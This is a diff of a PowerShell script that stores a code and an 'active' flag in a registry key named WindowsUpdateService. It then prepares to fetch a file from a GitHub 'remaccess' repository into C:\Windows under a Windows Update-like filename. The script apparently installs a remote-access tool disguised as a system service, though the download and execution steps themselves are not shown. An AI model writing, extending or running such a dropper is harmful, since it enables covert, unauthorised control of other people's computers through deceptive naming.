@@ -1,6 +1,5 @@
 # Prompt the user for the values
 $code = Read-Host "Enter the code"
-$data = Read-Host "Enter the data"
 # Define the registry path
 $regPath = "HKLM:\Software\WindowsUpdateService"
 if (-not (Test-Path $regPath)) {
@@ -8,7 +7,7 @@ if (-not (Test-Path $regPath)) {
 }
 # Set the values in the Registry
 Set-ItemProperty -Path $regPath -Name "Code" -Value $code
-Set-ItemProperty -Path $regPath -Name "Data" -Value $data
+Set-ItemProperty -Path $regPath -Name "Data" -Value active
 $url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
 $outputPath = "C:\Windows\WindowsUpdateService.ps1"
 Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
